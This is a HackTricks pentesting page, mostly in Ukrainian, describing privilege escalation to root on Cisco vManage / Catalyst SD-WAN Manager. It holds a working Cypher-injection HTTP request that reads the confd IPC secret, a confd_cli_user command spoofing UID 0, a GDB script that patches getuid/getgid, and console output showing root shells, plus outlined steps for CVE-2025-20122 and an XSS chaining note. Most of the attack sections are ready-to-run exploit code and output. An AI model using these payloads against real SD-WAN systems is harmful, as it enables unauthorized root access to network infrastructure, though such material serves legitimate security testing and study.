# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Шлях 1

(Приклад з [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Після невеликого вивчення деякої [documentation](http://66.218.245.39/doc/html/rn03re18.html), пов'язаної з `confd` та різними бінарними файлами (доступними з обліковим записом на сайті Cisco), ми виявили, що для аутентифікації IPC socket він використовує секрет, розташований у `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Пам'ятаєте наш екземпляр Neo4j? Він працює під привілеями користувача `vmanage`, що дозволяє нам отримати файл, використовуючи попередню вразливість:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Отже, ми можемо напряму викликати `/usr/bin/confd_cli_user` з нашим набором аргументів. Проте вона недоступна для читання з нашими поточними привілеями, тому нам потрібно витягти її з rootfs і скопіювати за допомогою scp, переглянути help і використати її, щоб отримати shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Шлях 2

(Приклад з [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Блог¹ команди synacktiv описував елегантний спосіб отримати root shell, але зауваження в тому, що для цього потрібно отримати копію `/usr/bin/confd_cli_user`, яка доступна для читання лише root. Я знайшов інший спосіб піднятися до root без таких клопотів.

Коли я дизасемблював бінарний файл `/usr/bin/confd_cli`, я помітив наступне:

<details>
<summary>Objdump, що показує збір UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Коли я запускаю “ps aux”, я побачив наступне (_примітка -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Я припустив, що програма “confd_cli” передає ідентифікатор користувача та ідентифікатор групи, які вона отримала від залогіненого користувача, до застосунку “cmdptywrapper”.

Моя перша спроба була запустити “cmdptywrapper” безпосередньо й передати йому `-g 0 -u 0`, але це не вдалося. Схоже, десь по дорозі було створено дескриптор файлу (-i 1015), який я не можу підробити.

Як зазначено в блозі synacktiv (останній приклад), програма `confd_cli` не підтримує аргументи командного рядка, але я можу впливати на неї через відлагоджувач, і на щастя GDB встановлено в системі.

Я створив GDB-скрипт, в якому змусив API `getuid` і `getgid` повертати 0. Оскільки я вже маю привілеї “vmanage” через deserialization RCE, у мене є дозвіл безпосередньо читати `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Вивід консолі:

<details>
<summary>Вивід консолі</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug)

Cisco перейменувала vManage на *Catalyst SD-WAN Manager*, але підлеглий CLI все ще працює на тій самій машині. Офіційне повідомлення 2025 року (CVE-2025-20122) описує недостатню валідацію вводу в CLI, яка дозволяє **any authenticated local user** отримати root, відправивши сформований запит до сервісу manager CLI. Поєднайте будь-який низькопривілейний доступ (наприклад, Neo4j deserialization з Path1 або shell для cron/backup користувача) з цією вразливістю, щоб піднятися до root без копіювання `confd_cli_user` або прикріплення GDB:

1. Використайте свій низькопривілейний shell, щоб знайти CLI IPC endpoint (зазвичай слухач `cmdptywrapper`, показаний на порту 4565 в Path2).
2. Сформуйте CLI-запит, що підробляє поля UID/GID в 0. Баг валідації не примушує використовувати UID початкового виклику, тож wrapper запускає root-backed PTY.
3. Пропустіть будь-яку послідовність команд (`vshell; id`) через підроблений запит, щоб отримати root shell.

> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
